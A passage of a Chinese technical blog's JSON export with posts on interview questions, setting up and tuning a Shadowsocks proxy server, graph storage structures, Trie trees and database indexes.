https://wiki.jikexueyuan.com/project/easy-learn-algorithm/fast-sort.html","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Interview】应聘者提问","date":"2019-06-19T12:51:39.000Z","path":"2019/06/19/【Interview】应聘者提问/","text":"SOA 如何看待SOA 如何看待Component-based software development 下一个SOA orchestration 和chereography IoT 如何看待Edge Computing 职位 团队情况和技术栈 个人 个人的不足（或者说，个人在知识点掌握方面有哪些不足） 个人哪些能力部分可能不能胜任职位 Java Happen-before原则 分布式系统 Message-oriended System的可靠性（因为系统发出消息后就不管了，或者说管不了，事实上，可能出现消息broker系统挂机的情况）。 消息队列一般用在哪里 分布式事务的最佳实践 TCC（Try-Confirm-Cancel）与三阶段提交的区别 团队 请问贵部门在整个集团中是作为一个怎么样的角色与其他部门做交互？","comments":true,"categories":[{"name":"Interview","slug":"Interview","permalink":"http://swsmile.info/categories/Interview/"}],"tags":[{"name":"Interview","slug":"Interview","permalink":"http://swsmile.info/tags/Interview/"}]},{"title":"【Network】Shadowsocks总结","date":"2019-06-19T01:25:08.000Z","path":"2019/06/19/【Network】Shadowsocks -Shadowsocks总结/","text":"Shadowsocks ServerShadowsocks Server的实现Shadowsocks Server分为Python、Go、C++ with Qt、C with libevb和Perl版本。 shadowsocks: The original Python implementation. shadowsocks-libev: Lightweight C implementation for embedded devices and low end boxes. Very small footprint (several megabytes) for thousands of connections. go-shadowsocks2: Another Go implementation focusing on core features and code reusability. shadowsocks-rust: A rust port of shadowsocks. 关于shadowsocks-libevshadowsocks-libev，是一个基于 libev 库开发的 shadowsocks 代理套件。包含ss-local,ss-redir,ss-tunnel,ss-server四部分。 ss-server是shadowsocks 的服务端程序。 ss-local是shadowsocks 客户端程序。 ss-redir是透明代理工具。 ss-tunnel是本地端口转发工具，通常用于解决 dns 污染问题。 Shadowsocks Server的搭建Debian / Ubuntu: 12apt-get install python-pippip install shadowsocks CentOS: 12yum install python-setuptools &amp;&amp; easy_install pippip install shadowsocks Shadowsocks Server的操作系统选择建议选择 Ubuntu 14.04 LTS 作为服务器以便使用 TCP Fast Open。除非有明确理由，不建议用对新手不友好的 CentOS。 Shadowsocks Server的VPS选择为了更好的性能，VPS 尽量选择 XEN 或 KVM，不要使用 OpenVZ。推荐使用以下 VPS： Digital Ocean 自带的内核无需自己编译模块即可使用 hybla 算法 Linode 功能强大，机房较多 Shadowsocks Server的运行启动前台运行123ssserver -p 443 -k password -m rc4-md5# 使用配置文件ssserver -c /etc/shadowsocks.json 后台运行1sudo ssserver -p 443 -k password -m rc4-md5 --user nobody -d start 如果要停止： 1sudo ssserver -d stop 如果要检查日志： 1sudo less /var/log/shadowsocks.log 配置文件You can use a configuration file instead of command line arguments. Create a config file /etc/shadowsocks.json. Example: 12345678910&#123; &quot;server&quot;:&quot;my_server_ip&quot;, &quot;server_port&quot;:8388, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;mypassword&quot;, &quot;timeout&quot;:300, &quot;method&quot;:&quot;aes-256-cfb&quot;, &quot;fast_open&quot;: false&#125; Explanation of the fields: Name Explanation server the address your server listens server_port server port local_address the address your local listens local_port local port password password used for encryption timeout in seconds method default: “aes-256-cfb” fast_open use TCP_FASTOPEN, true / false workers number of workers, available on Unix/Linux 加密方式The default cipher is chacha20-ietf-poly1305. The strongest option is an AEAD cipher. The recommended choice is “chacha20-ietf-poly1305” or “aes-256-gcm”. salsa20 and chacha20 are fast stream ciphers. Optimized salsa20 implementation on x86_64 is even 2x faster than rc4 (but slightly slower on ARM). These legacy ciphers are either slow or not safe. Do not use them: rc4 des-cfb table salsa20-ctr 参数For a detailed and complete list of all supported arguments, you may refer to the man pages of the applications, respectively. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889ss-[local|redir|server|tunnel|manager] -s &lt;server_host&gt; Host name or IP address of your remote server. -p &lt;server_port&gt; Port number of your remote server. -l &lt;local_port&gt; Port number of your local server. -k &lt;password&gt; Password of your remote server. -m &lt;encrypt_method&gt; Encrypt method: rc4-md5, aes-128-gcm, aes-192-gcm, aes-256-gcm, aes-128-cfb, aes-192-cfb, aes-256-cfb, aes-128-ctr, aes-192-ctr, aes-256-ctr, camellia-128-cfb, camellia-192-cfb, camellia-256-cfb, bf-cfb, chacha20-ietf-poly1305, xchacha20-ietf-poly1305, salsa20, chacha20 and chacha20-ietf. The default cipher is chacha20-ietf-poly1305. [-a &lt;user&gt;] Run as another user. [-f &lt;pid_file&gt;] The file path to store pid. [-t &lt;timeout&gt;] Socket timeout in seconds. [-c &lt;config_file&gt;] The path to config file. [-n &lt;number&gt;] Max number of open files. [-i &lt;interface&gt;] Network interface to bind. (not available in redir mode) [-b &lt;local_address&gt;] Local address to bind. For servers: Specify the local address to use while this server is making outbound connections to remote servers on behalf of the clients. For clients: Specify the local address to use while this client is making outbound connections to the server. [-u] Enable UDP relay. (TPROXY is required in redir mode) [-U] Enable UDP relay and disable TCP relay. (not available in local mode) [-L &lt;addr&gt;:&lt;port&gt;] Destination server address and port for local port forwarding. (only available in tunnel mode) [-6] Resolve hostname to IPv6 address first. [-d &lt;addr&gt;] Name servers for internal DNS resolver. (only available in server mode) [--reuse-port] Enable port reuse. [--fast-open] Enable TCP fast open. with Linux kernel &gt; 3.7.0. (only available in local and server mode) [--acl &lt;acl_file&gt;] Path to ACL (Access Control List). (only available in local and server mode) [--manager-address &lt;addr&gt;] UNIX domain socket address. (only available in server and manager mode) [--mtu &lt;MTU&gt;] MTU of your network interface. [--mptcp] Enable Multipath TCP on MPTCP Kernel. [--no-delay] Enable TCP_NODELAY. [--executable &lt;path&gt;] Path to the executable of ss-server. (only available in manager mode) [-D &lt;path&gt;] Path to the working directory of ss-manager. (only available in manager mode) [--key &lt;key_in_base64&gt;] Key of your remote server. [--plugin &lt;name&gt;] Enable SIP003 plugin. (Experimental) [--plugin-opts &lt;options&gt;] Set SIP003 plugin options. (Experimental) [-v] Verbose mode. Shadowsocks Server的配置优化TCP Fast OpenIf both of your server and client are deployed on Linux 3.7.1 or higher, you can turn on fast_open for lower latency. First set fast_open to true in your config.json. Then turn on fast open on your OS temporarily: 1echo 3 &gt; /proc/sys/net/ipv4/tcp_fastopen BBR（一种TCP拥塞控制算法）使用BBR加速需要服务器端主机完整的内核版本为4.9+的支持，下面一Linode主机为例进行设置。 首先Linode主机提供的内核版本虽然大于4.9，但是内核却不完整，并不包含BBR组件，无法直接开启。所以我们要先安装完整内核（64位）。 升级Linux内核BBR在Linux kernel 4.9引入。首先检查服务器kernel版本： Bash 1uname -r 如果其显示版本在4.9.0之下，则需要升级Linux内核，否则请忽略下文。 更新包管理器： Bash 1sudo apt update 查看可用的Linux内核版本： Bash 1sudo apt-cache showpkg linux-image 找到一个你想要升级的Linux内核版本，如“linux-image-4.10.0-22-generic”： Bash 1sudo apt install linux-image-4.10.0-22-generic 等待安装完成后重启服务器： Bash 1sudo reboot 删除老的Linux内核： Bash 1sudo purge-old-kernels 开启BBR运行lsmod | grep bbr，如果结果中没有tcp_bbr，则先运行： Bash 12modprobe tcp_bbrecho \"tcp_bbr\" &gt;&gt; /etc/modules-load.d/modules.conf 运行： Bash 12echo \"net.core.default_qdisc=fq\" &gt;&gt; /etc/sysctl.confecho \"net.ipv4.tcp_congestion_control=bbr\" &gt;&gt; /etc/sysctl.conf 运行： Bash 1sysctl -p 保存生效。运行： Bash 12sysctl net.ipv4.tcp_available_congestion_controlsysctl net.ipv4.tcp_congestion_control 若均有bbr，则开启BBR成功。 hybla 算法Maximum Number of Open File Descriptors and Kernel ParametersFirst of all, upgrade your Linux kernel to 3.5 or later. Step 1, increase the maximum number of open file descriptors To handle thousands of concurrent TCP connections, we should increase the limit of file descriptors opened. Edit the limits.conf 1vi /etc/security/limits.conf Add these two lines 12* soft nofile 51200* hard nofile 51200 Then, before you start the shadowsocks server, set the ulimit first 1ulimit -n 51200 Step 2, Tune the kernel parameters The priciples of tuning parameters for shadowsocks are Reuse ports and conections as soon as possible. Enlarge the queues and buffers as large as possible. Choose the TCP congestion algorithm for large latency and high throughput. Here is an example /etc/sysctl.conf of our production servers: 123456789101112131415161718192021fs.file-max = 51200net.core.rmem_max = 67108864net.core.wmem_max = 67108864net.core.netdev_max_backlog = 250000net.core.somaxconn = 4096net.ipv4.tcp_syncookies = 1net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_tw_recycle = 0net.ipv4.tcp_fin_timeout = 30net.ipv4.tcp_keepalive_time = 1200net.ipv4.ip_local_port_range = 10000 65000net.ipv4.tcp_max_syn_backlog = 8192net.ipv4.tcp_max_tw_buckets = 5000net.ipv4.tcp_fastopen = 3net.ipv4.tcp_mem = 25600 51200 102400net.ipv4.tcp_rmem = 4096 87380 67108864net.ipv4.tcp_wmem = 4096 65536 67108864net.ipv4.tcp_mtu_probing = 1net.ipv4.tcp_congestion_control = hybla Of course, remember to execute sysctl -p to reload the config at runtime. How to verify your optimizations work Use munin or any server monitor tools to generate the graph of your TCP connections. A well tuned server should look like this 其他Shadowsocks 中继（relay）If you want your client connected to a Japan VPS, but you want a US IP. 1Client &lt;--&gt; Japan VPS &lt;--&gt; US VPS Shadowsocks ClientShadowsocks Client的实现 shadowsocks-android: Android client. shadowsocks-windows: Windows client. shadowsocksX-NG: MacOS client. shadowsocks-qt5: Cross-platform client for Windows/MacOS/Linux. 注意，shadowsocks-libev既包含了Shadowsocks Server（称为shadowsocks-libev-server），也包含了Shadowsocks Client（称为shadowsocks-libev）。 Reference shadowsocks - https://shadowsocks.org/en/download/servers.html Shadowsocks 使用说明 - https://github.com/shadowsocks/shadowsocks/wiki/Shadowsocks-%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E Ubuntu 16.04下Shadowsocks服务器端安装及优化 - https://www.polarxiong.com/archives/Ubuntu-16-04下Shadowsocks服务器端安装及优化.html","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Data Structure】图（Graph） - 图的物理存储","date":"2019-06-14T07:35:37.000Z","path":"2019/06/14/【Data-Structure】图-图的物理存储/","text":"图的顺序存储方法 - 邻接矩阵（Adjacency Matrix）使用数组存储图时，需要使用两个数组，一个数组存放图中顶点本身的数据（一维数组），另外一个数组用于存储各顶点之间的关系（二维数组）。 如果只是存储图中包含的顶点，使用一维数组就足够了； 然而，我们还需要存储顶点之间的关系，因此要记录每个顶点和其它所有顶点之间的关系，所以需要使用二维数组。 这个二维数组称为邻接矩阵（Adjacency Matrix）。 不同类型的图，存储的方式略有不同，根据图有无权，可以将图划分为两大类：图和网 。 图，包括无向图和有向图；网，是指带权的图，包括无向网和有向网。 存储方式的不同，指的是：在使用二维数组存储图中顶点之间的关系时，如果顶点之间存在边或弧，在相应位置用 1 表示，反之用 0 表示；如果使用二维数组存储网中顶点之间的关系，顶点之间如果有边或者弧的存在，在数组的相应位置存储其权值；反之用 0 表示。 无向图我们来看一个无向图的实例，下图的左图就是一个无向图： 对于无向图来说，二维数组构成的邻接矩阵，实际上是对称矩阵。因此，在存储时就可以采用压缩存储的方式存储下三角或者上三角。 通过二阶矩阵，可以直观地计算出各个顶点的度，为该行（或该列）非 0 值的和。例如，第一行有两个 1，说明 V1 有两个边，所以度为 2。 有向图我们再来看一个有向图的样例，如下图所示的左图： 例如，arcs[0][1] = 1 ，证明从 V1 到 V2 有弧存在。且通过邻接矩阵，可以很轻松得知各顶点的出度和入度，出度为该行非 0 值的和，入度为该列非 0 值的和。例如，V1 的出度为 2 （因为第二行中有两个 1 ），为 2 ； V1 的入度为 1 （第二列中只有一个 1 ）。 通常，图更多的是采用链表存储，具体的存储方法有 3 种，分别是： 邻接表 十字链表 邻接多重表 图的链式存储方法 - 邻接表（Adjacency List）我们发现，当图中的边数相对于顶点较少时，使用邻接矩阵会对存储空间的极大浪费。我们可以考虑对边或弧使用链式存储的方式来解决空间浪费的问题。回忆树结构的孩子表示法，将结点存入数组，并对结点的孩子进行链式存储，不管有多少孩子，也不会存在空间浪费问题。 应用这种思路，我们把这种数组与链表相结合的存储方法称为邻接表（Adjacency List）。 邻接表既适用于存储无向图，也适用于存储有向图。 一些概念邻接点在具体讲解邻接表存储图的实现方法之前，先普及一个”邻接点“的概念。在图中，如果两个点相互连通，即通过其中一个顶点，可直接找到另一个顶点，则称它们互为邻接点。 邻接指的是图中顶点之间有边或者弧的存在。 邻接表邻接表存储图的实现方式是，给图中的各个顶点独自建立一个链表，用节点存储该顶点，用链表中其他节点存储各自的邻接点。 与此同时，为了便于管理这些链表，通常会将所有链表的头节点存储到数组中（也可以用链表存储）。也正因为各个链表的头节点存储的是各个顶点，因此各链表在存储临界点数据时，仅需存储该邻接顶点位于数组中的位置下标即可。 例如，下图中的有向图，其对应的邻接表如下所示： 拿顶点 V1 来说，与其相关的邻接点分别为 V2 和 V3，因此存储 V1 的链表中存储的是 V2 和 V3 在数组中的位置下标 1 和 2。 从上图中可以看出，存储各顶点的节点结构分为两部分，数据域和指针域。数据域用于存储顶点数据信息，指针域用于链接下一个节点，如下图所示： 在实际应用中，除了上图这种节点结构外，对于用链接表存储网（边或弧存在权）结构，还需要节点存储权的值，因此需使用下图中的节点结构： 邻接表计算顶点的出度和入度使用邻接表计算无向图中顶点的入度和出度会非常简单，只需从数组中找到该顶点然后统计此链表中节点的数量即可。 而使用邻接表存储有向图时，通常各个顶点的链表中存储的都是以该顶点为弧尾的邻接点，因此通过统计各顶点链表中的节点数量，只能计算出该顶点的出度，而无法计算该顶点的入度。 对于利用邻接表求某顶点的入度，有两种方式： 遍历整个邻接表中的节点，统计数据域与该顶点所在数组位置下标相同的节点数量，即为该顶点的入度； 建立一个逆邻接表，该表中的各顶点链表专门用于存储以此顶点为弧头的所有顶点在数组中的位置下标。比如说，建立一张上图a) 对应的逆邻接表，如下图所示： 对于具有 n 个顶点和 e 条边的无向图，邻接表中需要存储 n 个头结点和 2e 个表结点。在图中边或者弧稀疏的时候，使用邻接表要比前一节介绍的邻接矩阵更加节省空间。 图的链式存储方法 - 十字链表与邻接表不同，十字链表法仅适用于存储有向图和有向网。不仅如此，十字链表法还改善了邻接表计算图中顶点入度较为麻烦的问题。 十字链表存储有向图（网）的方式与邻接表有一些相同，都以图（网）中各顶点为首元节点建立多条链表，同时为了便于管理，还将所有链表的首元节点存储到同一数组（或链表）中。 其中，建立一个链表，用于存储顶点的首元节点的结构如下图所示： 从上图可以看出，首元节点中有一个数据域和两个指针域（分别用 firstin 和 firstout 表示）： firstin 指针用于连接以当前顶点为弧头的其他顶点构成的链表； firstout 指针用于连接以当前顶点为弧尾的其他顶点构成的链表； data 用于存储该顶点中的数据； 由此可以看出，十字链表实质上就是为每个顶点建立两个链表，分别存储以该顶点为弧头的所有顶点和以该顶点为弧尾的所有顶点。 注意，存储图的十字链表中，各链表中首元节点与其他节点的结构并不相同，图 1 所示仅是十字链表中首元节点的结构，链表中其他普通节点的结构如图 2 所示： 十字链表中普通节点的结构示意图图 2 十字链表中普通节点的结构示意图 从图 2 中可以看出，十字链表中普通节点的存储分为 5 部分内容，它们各自的作用是： tailvex 用于存储以首元节点为弧尾的顶点位于数组中的位置下标； headvex 用于存储以首元节点为弧头的顶点位于数组中的位置下标； hlink 指针：用于链接下一个存储以首元节点为弧头的顶点的节点； tlink 指针：用于链接下一个存储以首元节点为弧尾的顶点的节点； （info 指针：用于存储与该顶点相关的信息，例如量顶点之间的权值；） 比如说，用十字链表存储图 3a) 中的有向图，存储状态如图 3b) 所示： 十字链表存储有向图示意图图 3 十字链表存储有向图示意图 拿图 3 中的顶点 V1 来说，通过构建好的十字链表得知，以该顶点为弧头的顶点只有存储在数组中第 3 位置的 V4（因此该顶点的入度为 1），而以该顶点为弧尾的顶点有两个，分别为存储数组第 1 位置的 V2 和第 2 位置的 V3（因此该顶点的出度为 2）。 对于图 3 各个链表中节点来说，由于表示的都是该顶点的出度或者入度，因此没有先后次序之分。 图的链式存储方法 - 邻接多重表Reference 数据结构概述 - http://data.biancheng.net/intro/ 《Algorithm》 《大话数据结构》","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】图（Graph） - 图的深度优先搜索（Depth First Search）","date":"2019-06-14T02:52:52.000Z","path":"2019/06/14/【Data-Structure】图-图的深度优先搜索/","text":"","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】多叉搜索树 - Trie树（字典树）","date":"2019-06-13T07:33:37.000Z","path":"2019/06/13/【Data-Structure】树-多叉搜索树-Trie树/","text":"Trie树Trie树，又叫字典树、前缀树（Prefix Tree）、单词查找树或键树，是一种多叉树结构。如下图： 从上图可以归纳出Trie树的基本性质： 根节点不包含字符，除根节点外的每一个子节点都包含一个字符。 从根节点到某一个节点，路径上经过的字符连接起来，为该节点对应的字符串。 每个节点的所有子节点包含的字符互不相同。 通常在实现的时候，会在节点结构中设置一个标志，用来标记该结点处是否构成一个单词（关键字）。 可以看出，Trie树的关键字一般都是字符串，而且Trie树把每个关键字保存在一条路径上，而不是一个结点中。另外，两个有公共前缀的关键字，在Trie树中前缀部分的路径相同，所以Trie树又叫做前缀树（Prefix Tree）。 典型应用是用于统计和排序大量的字符串（但不仅限于字符串），所以经常被搜索引擎系统用于文本词频统计。它的优点是最大限度地减少无谓的字符串比较，查询效率比较高。 Trie的核心思想是空间换时间，利用字符串的公共前缀来降低查询时间的开销以达到提高效率的目的。 搜索 Trie 树的时间复杂度在 Trie 树中搜索一个字符串，会从根节点出发，沿着某条链路向下逐字比对字符串的每个字符，直到抵达底部的叶子节点才能确认字符串为该词，这种检索方式具有以下两个优点： 公共前缀的词都位于同一个串内，查词范围因此被大幅缩小（比如首字不同的字符串，都会被排除）。 Trie 树实质是一个有限状态自动机（(Definite Automata, DFA），这就意味着从 Trie 树的一个节点（状态）转移到另一个节点（状态）的行为完全由状态转移函数控制，而状态转移函数本质上是一种映射，这意味着：逐字搜索 Trie 树时，从一个字符到下一个字符比对是不需要遍历该节点的所有子节点的。 Trie树的局限性如前文所讲，Trie的核心思想是空间换时间，利用字符串的公共前缀来降低查询时间的开销以达到提高效率的目的。 假设字符的种数有m个，有若干个长度为n的字符串构成了一个 Trie树 ，则每个节点的出度为 m（即每个节点的可能子节点数量为m），Trie树 的高度为n。很明显我们浪费了大量的空间来存储字符，此时Trie树的最坏空间复杂度为$O(m^n)$。也正由于每个节点的出度为m，所以我们能够沿着树的一个个分支高效的向下逐个字符的查询，而不是遍历所有的字符串来查询，此时Trie树的最坏时间复杂度为O(n)。 这正是空间换时间的体现，也是利用公共前缀降低查询时间开销的体现。 操作Trie树的插入操作 Trie树的插入操作很简单，其实就是将单词的每个字母逐一插入 Trie树。插入前先看字母对应的节点是否存在，存在则共享该节点，不存在则创建对应的节点。比如要插入新单词cook，就有下面几步： 插入第一个字母 c，发现 root 节点下方存在子节点 c，则共享节点 c 插入第二个字母 o，发现 c 节点下方存在子节点 o，则共享节点 o 插入第三个字母 o，发现 o 节点下方不存在子节点 o，则创建子节点 o 插入第三个字母 k，发现 o 节点下方不存在子节点 k，则创建子节点 k 至此，单词 cook 中所有字母已被插入 Trie树 中，然后设置节点 k 中的标志位，标记路径 root-&gt;c-&gt;o-&gt;o-&gt;k这条路径上所有节点的字符可以组成一个单词cook Trie树的查询操作在 Trie 树中查找一个字符串的时候，比如查找字符串 code，可以将要查找的字符串分割成单个的字符 c，o，d，e，然后从 Trie 树的根节点开始匹配。如图所示，绿色的路径就是在 Trie 树中匹配的路径。 如果要查找的是字符串cod(鳕鱼)呢？还是可以用上面同样的方法，从根节点开始，沿着某条路径来匹配，如图所示，绿色的路径，是字符串cod匹配的路径。但是，路径的最后一个节点「d」并不是橙色的，并不是单词标志位，所以cod字符串不存在。也就是说，cod是某个字符串的前缀子串，但并不能完全匹配任何字符串。 使用范围既然学Trie树，我们肯定要知道这玩意是用来干嘛的。 字符串检索给出 N 个单词组成的熟词表，以及一篇全用小写英文书写的文章，按最早出现的顺序写出所有不在熟词表中的生词。 检索/查询功能是Trie树最原始的功能。思路就是从根节点开始一个一个字符进行比较： 如果沿路比较，发现不同的字符，则表示该字符串在集合中不存在。 如果所有的字符全部比较完并且全部相同，还需判断最后一个节点的标志位（标记该节点是否代表一个关键字）。 12345struct trie_node&#123; bool isKey; // 标记该节点是否代表一个关键字 trie_node *children[26]; // 各个子节点 &#125;; 词频统计Trie树常被搜索引擎系统用于文本词频统计 。 思路：为了实现词频统计，我们修改了节点结构，用一个整型变量count来计数。对每一个关键字执行插入操作，若已存在，计数加1，若不存在，插入后count置1。 12345struct trie_node&#123; int count; // 记录该节点代表的单词的个数 trie_node *children[26]; // 各个子节点 &#125;; 前缀匹配如果我想获取所有以”a”开头的字符串，从图中可以很明显的看到是：and,as,at，如果不用trie树，你该怎么做呢？很显然朴素的做法时间复杂度为$O(N^2)$ ，那么用Trie树就不一样了，它可以做到h，h为你检索单词的长度，可以说这是秒杀的效果。 例如：找出一个字符串集合中所有以ab开头的字符串。我们只需要用所有字符串构造一个trie树，然后输出以a-&gt;b-&gt;开头的路径上的关键字即可。 trie树前缀匹配常用于搜索提示。如当输入一个网址，可以自动搜索出可能的选择。当没有完全匹配的搜索结果，可以返回前缀最相似的可能。 例如：找出一个字符串集合中所有以 五分钟 开头的字符串。我们只需要用所有字符串构造一个 trie树，然后输出以 五−&gt;分−&gt;钟 开头的路径上的关键字即可。 trie树前缀匹配常用于搜索提示。如当输入一个网址，可以自动搜索出可能的选择。当没有完全匹配的搜索结果，可以返回前缀最相似的可能： 字符串排序Trie树可以对大量字符串按字典序进行排序，思路也很简单：遍历一次所有关键字，将它们全部插入trie树，树的每个结点的所有儿子很显然地按照字母表排序，然后先序遍历输出Trie树中所有关键字即可。 作为其他数据结构和算法的辅助结构如后缀树，AC自动机等。 Trie 树的几种实现Array Trie 树很多文章里将这种实现称为“标准 Trie 树”，但其实它只是 Trie 众多实现中的一种而已，由于这种实现结构简单，检索效率很好，作为讲解示例很不错，因此特地改称其为“经典 Trie 树”。 abc、d、da、dda 四个字符串构成的 Trie 树，如果是字符串会在节点的尾部进行标记。没有后续字符的 branch 分支指向NULL 如上图，这种实现的特点是：每个节点都由指针数组存储，每个节点的所有子节点都位于一个数组之中，每个数组都是完全一样的。对于英文而言，每个数组有27个指针，其中一个作为词的终结符，另外 26 个依次代表字母表中的一个字母，对应指针指向下一个状态，若没有后续字符则指向NULL。 由于数组取词的复杂度为O(1)，因此这种实现的 Trie 树效率非常的高，比如要在一个节点中写入字符“c”，则直接在相应数组的第三个位置标入状态即可，而要确定字母“b”是否在现有节点的子节点之中，检查子节点所在数组第二个元素是否为空即可，这种实现巧妙的利用了等长数组中元素位置和值的一一对应关系，完美的实现了了寻址、存值、取值的统一。 但其缺点也很明显，它强制要求链路每一层都要有一个数组，每个数组都必须等长，这在实际应用中会造成大多数的数组指针空置（从上图就可以看出），事实上，对于真实的词典而言，公共前缀相对于节点数量而言还是太少，这导致绝大多数节点下并没有太多子节点。而对于中文这样具有大量单字的语言，若采取这样的实现，空置指针的数量简直不可想象。因此，经典 Trie 树是一种典型的以“空间换时间”的实现方式。一般只是拿来用于课程设计和新手练习，很少实际应用。 List Trie 树由于数组的长度是不可变，因此经典 Trie 树存在着明显的空间浪费。但是如果将每一层都换成可变数组（不同语言对这种数据结构称呼不同，比如在 Python 中为List，C# 称为 LinkedList）来存储节点（见下图），每层可以根据节点的数量动态调整数组的长度，就可以避免大量的空间浪费。下图就是这种实现的图例： 但是可变长数组的取词复杂度是O(d),其中 d 为数组的长度，这意味着状态转移函数无法通过映射转移到下一节点，必须先遍历数组，找到节点后再做转移，因此Trie 树实际时间复杂度变为O(m*n)(其中n为每层数组中节点的数量)。这显然降低了查询效率,因此还算不上完善。 Hash Trie 树可变数组取词速度太慢，于是就有人想起用一组键值对（Java中可用HashMap类型，Python 中为 dict 类型，C#为Dictionary类型）代替可变数组：其中每个节点包含一组 Key-Value，每个 Key 对应该节点下的一个子节点字符，value 则指向相应的后一个状态。这种方式可以有效的减少空间浪费，同时由于键值对本质上就是一个哈希实现，因此理论上其查词效率也很高（理想状态下取词复杂度为O(1)）。但是哈希有的缺点，这种实现的 Trie 树也会有： 为了尽可能的避免键值冲突，哈希表需要额外的空间避开碰撞，因此仍有一部分的空间会被浪费； 哈希表很难做到完美，尤其是数据体量增大之后，其查词复杂度常常难以维持在O(1)，同时，对哈希值的计算也需要额外的时间，因此实际查询效率要比经典实现低，其具体复杂度由相应的哈希实现来定。 与数组和可变数组实现相比，这种实现做到了空间和时间上的一种平衡，这个结果并不意外，因为哈希表本身就是平衡数组（查寻迅速、增删悲剧）和可变数组（增删迅速，查询悲剧）相应优点和缺点的一种数据结构。总体而言，Hash Trie 结构简单，性能堪用，而且由于哈希实现可以为每个节点分配唯一的id,因此可以做到节点的实时动态添加（这点是非常大的优势）因此对于中小规模的词典或者对词典的实时更新有需求的应用，该实现非常适合。 Double-array Trie 树双数组 Trie 树是目前 Trie 树各种实现中性能和存储空间均达到很好效果的实现。但其完整的实现比较复杂，对于新手而言入手相对较难。 Base Array 的作用双数组 Trie 树和经典 Trie 树一样，也是用数组实现 Trie 树。只不过它是将所有节点的状态都记录到一个数组之中（Base Array），以此避免数组的大量空置。以行文开头的示例为例，每个字符在 Base Array 中的状态可以是这样子的： 好吧，我撒了个慌，事实上，为了能使单个数组承载更多的信息，Base Array 仅仅会通过数组的位置记录下字符的状态（节点），比如用数组中的位置 2 指代“清”节点、 位置 7 指代 “中”节点；而数组中真正存储的值其实是一个整数，这个整数我们称之为“转移基数”，比如位置2的转移基数为 base[2]=3位置7的转移基数为base[7]=2，因此在不考虑叶子节点的情况下， Base Array 是这样子的： 转移基数是为了在一维数组中实现 Trie 树中字符的链路关系而设计的，举例而言，如果我们知道一个词中某个字符节点的转移基数，那么就可以据此推断出该词下一个节点在 Base Array 中的位置：比如知道 “清华”首字的转移基数为base[2]=3，那么“华”在数组中的位置就为base[2]+code(&quot;华&quot;)，这里的code(&quot;华&quot;)为字符表中“华”的编码，假设例树的字符编码表为： 清-1，华-2，大-3，学-4，新-5，中-6，人-7 那么“华”的位置应该在Base Array 中的的第 5 位（base[2]+code(&quot;华&quot;)=3+2=5）： 而所有词的首字，则是通过根节点的转移基数推算而来。因此，对于字典中已有的词，只要我们每次从根节点出发，根据词典中各个字符的编码值，结合每个节点的转移基数，通过简单的加法，就可以在Base Array 中实现词的链路关系。以下是“清华”、“清华大学”、“清新”、“中华”、“华人”五个词在 Base Array 中的链路关系： Reference Wikipedia Trie - https://zh.wikipedia.org/wiki/Trie 6天通吃树结构—— 第五天 Trie树 - https://www.cnblogs.com/huangxincheng/archive/2012/11/25/2788268.html Trie树（Prefix Tree）介绍 - https://blog.csdn.net/lisonglisonglisong/article/details/45584721 Trie树（字典树） - https://wizardforcel.gitbooks.io/the-art-of-programming-by-july/content/06.09.html 小白详解 Trie 树 - https://segmentfault.com/a/1190000008877595","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Database】数据库索引（Index）","date":"2019-06-10T13:53:59.000Z","path":"2019/06/10/【Database】数据库索引/","text":"索引（Index）在关系数据库中，索引（Index）是一种单独的、物理的对数据库表中一列或多列的值进行排序的一种存储结构，它是某个表中一列或若干列值的集合和相应的指向表中物理标识这些值的数据页的逻辑指针清单。索引的作用相当于图书的目录，可以根据目录中的页码快速找到所需的内容。 MySQL官方对索引的定义为：索引（Index）是帮助MySQL高效获取数据的数据结构。提取句子主干，就可以得到索引的本质：索引是数据结构。 索引提供指向存储在表的指定列中的数据值的指针，然后根据您指定的排序顺序对这些指针排序。数据库使用索引以找到特定值，然后顺指针找到包含该值的行。这样可以使对应于表的SQL语句执行得更快，可快速访问数据库表中的特定信息。 当表中有大量记录时，若要对表进行查询，第一种搜索信息方式是全表搜索，是将所有记录一一取出，和查询条件进行一一对比，然后返回满足条件的记录，这样做会消耗大量数据库系统时间，并造成大量磁盘I/O想操作；第二种就是在表中建立索引，然后在索引中找到符合查询条件的索引值，最后通过保存在索引中的ROWID（相当于页码）快速找到表中对应的记录。 索引能够提高 SELECT 查询和 WHERE 子句的速度，但是却降低了包含 UPDATE 语句或 INSERT 语句的数据输入过程的速度。索引的创建与删除不会对表中的数据产生影响。 索引目的索引的目的在于提高查询效率，可以类比字典，如果要查“mysql”这个单词，我们肯定需要定位到m字母，然后从下往下找到y字母，再找到剩下的sql。如果没有索引，那么你可能需要把所有单词看一遍才能找到你想要的， 索引的添加删除添加索引的方法： 自动：在表上定义主键约束、唯一约束和外键约束的时候，系统就会为该数据列自动创建对应的索引。 手动：通过语句 create index index_name on table_name(column1,column2…)。 删除索引的方法： 自动：数据表被删除时，该表上的索引会被自动删除。 手动：通过语句 drop index indexname on tablename;。 索引类型 按数据唯一性区分：唯一索引（Unique Index）与非唯一索引 按索引的列的类型：主键索引（Primary Index）与辅助索引（Secondary Index） 